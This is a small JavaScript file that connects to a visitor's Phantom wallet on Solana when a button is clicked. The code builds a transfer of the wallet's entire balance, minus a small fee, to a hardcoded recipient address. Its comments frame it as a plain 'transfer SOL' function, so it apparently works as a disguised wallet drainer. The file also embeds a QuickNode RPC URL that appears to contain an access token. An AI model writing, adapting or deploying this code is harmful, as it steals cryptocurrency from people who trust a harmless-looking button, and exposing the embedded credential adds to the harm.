// Import Solana Web3.js library
const solanaWeb3 = require('@solana/web3.js');

// Define the recipient wallet address
const RECIPIENT_WALLET = '9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf';

// Set up the Solana connection using QuickNode RPC URL
const connection = new solanaWeb3.Connection(
    'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
    'confirmed'
);

// Function to transfer SOL
async function transferSOL() {
    try {
        // Check if Phantom wallet is installed
        if (!window.solana || !window.solana.isPhantom) {
            alert('Please install Phantom Wallet to proceed.');
            return;
        }

        // Connect to Phantom wallet
        const provider = window.solana;
        await provider.connect();

        // Get the user's public key
        const sender = provider.publicKey;
        if (!sender) {
            alert('Wallet connection failed.');
            return;
        }

        // Get the balance of the sender
        const balance = await connection.getBalance(sender);
        if (balance === 0) {
            alert('Insufficient balance in the wallet.');
            return;
        }

        // Create transaction to transfer SOL
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: sender,
                toPubkey: new solanaWeb3.PublicKey(RECIPIENT_WALLET),
                lamports: balance - 5000, // Reserve a small fee for transaction costs
            })
        );

        // Sign and send the transaction
        const signature = await provider.signAndSendTransaction(transaction);
        alert(`Transaction successful! Signature: ${signature}`);
    } catch (error) {
        alert(`Transaction failed: ${error.message}`);
    }
}

// Add event listener to the button
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('transfer-btn').addEventListener('click', transferSOL);
});
